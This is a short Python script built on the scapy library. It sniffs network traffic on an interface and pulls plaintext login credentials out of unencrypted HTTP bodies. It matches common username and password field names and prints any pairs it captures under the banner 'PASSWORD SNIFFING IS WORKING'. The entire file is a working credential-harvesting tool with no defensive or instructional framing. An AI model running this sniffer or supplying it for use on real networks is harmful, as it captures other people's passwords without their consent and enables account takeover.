from scapy.all import *
from urllib import parse
import re

from scapy.packet import Raw
from scapy.sendrecv import sniff

iface ="eth0"
print("PASSWORD SNIFFING IS WORKING WAITING FOR CLIENT TO LOGIN========")
def get_login_pass(body):

    user =None
    passwd = None

    userfield= ['log', 'lname','user','Uname', 'uname', 'username', 'email', 'mail']

    passfields = ['pass','pin', 'loginpass','passwd', 'password', 'pass1', 'pass3']


    for login in userfield:
        login_re= re.search('(%s=[^$]+)' % login, body, re.IGNORECASE)
        if login_re:
            user = login_re.group()
    for passfield in passfields:
        pass_re = re.search('(%s=[^$]+)' % passfield, body, re.IGNORECASE)
        if pass_re:
            passwd= pass_re.group()
    
    if user and passwd:
        return(user, passwd)


def pkt_parser(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
        body = str(packet[TCP].payload)
        user_pass=get_login_pass(body)
        if user_pass !=None:
            
            print(packet[TCP].payload)
            print("posible credisential found for ====>  " +parse.unquote(user_pass[0]))
            print("posible credisential found for ====>  " +parse.unquote(user_pass[1]))
            
    

    else:
        pass
      
try:
    sniff(iface=iface, prn= pkt_parser, store=0)
except KeyboardInterrupt:
    print("Aborting...")
    exit(0)